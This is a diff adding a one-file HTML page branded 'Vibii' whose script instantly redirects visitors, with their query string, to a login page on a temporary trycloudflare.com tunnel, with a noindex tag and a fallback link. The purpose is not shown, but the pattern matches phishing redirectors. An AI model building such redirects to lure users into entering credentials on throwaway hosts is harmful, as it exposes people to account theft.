@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vibii</title>
+<meta name="robots" content="noindex">
+<style>
+  :root { color-scheme: dark; }
+  body { margin: 0; min-height: 100dvh; display: grid; place-items: center; background: #120d22; color: #f3ecff;
+         font: 16px/1.5 system-ui, -apple-system, Segoe UI, sans-serif; text-align: center; padding: 16px; }
+  a { color: #f7a873; }
+</style>
+<script>
+  var target = "https://lists-ipaq-developed-everything.trycloudflare.com/login" + (location.search || "");
+  location.replace(target);
+</script>
+</head>
+<body>
+  <main>
+    <h1 style="font-weight:500;font-size:48px;margin:0">Vibii</h1>
+    <p>Opening your soundtrack… <a id="go" href="https://lists-ipaq-developed-everything.trycloudflare.com/login">Tap here if nothing happens</a>.</p>
+    <script>document.getElementById("go").href = target;</script>
+  </main>
+</body>
+</html>
